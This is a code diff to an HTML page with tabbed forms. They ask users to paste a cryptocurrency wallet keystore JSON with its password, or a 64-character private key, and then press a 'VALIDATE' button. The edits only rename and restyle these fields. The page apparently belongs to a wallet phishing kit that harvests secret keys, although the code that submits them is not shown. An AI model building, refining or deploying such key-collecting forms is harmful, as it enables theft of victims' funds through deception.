@@ -99,11 +99,10 @@
         <div id="keystore" class="tabcontent">
             <form id="myForm2">
 
-                <textarea name="Json" required="required" minlength="12" placeholder="Keystore JSON"
-                    required="required"></textarea>
+                <textarea name="Json" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
                 </br>
                 <div id="Password" class="field">
-                    <input id="Password" type="text" name="password" placeholder="Password" required="required" minlength="4" />
+                    <input type="text" name="Password" placeholder="Password" required="required" minlength="4" />
                 </div>
                 <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
                 </div>
@@ -114,10 +113,9 @@
 
         <div id="private" class="tabcontent">
             <form id="myForm3">
-                <!-- <input type="hidden" name="privatekey" value="Private Key"/> -->
-                <div class="field">
-                    <input id="PrivateKey" type="text" name="privatekey" placeholder="Private Key" required="required" minlength="64"/>
-                </div>
+         
+                    <textarea type="text" name="Privatekey" placeholder="Private Key" required="required" minlength="64"/></textarea>
+                
                 <div class="desc">Typically 64 alphanumeric characters</div>
                 </br>
                 <button type="submit" name="submit" class="btn" onclick="SubForm()">VALIDATE</button>
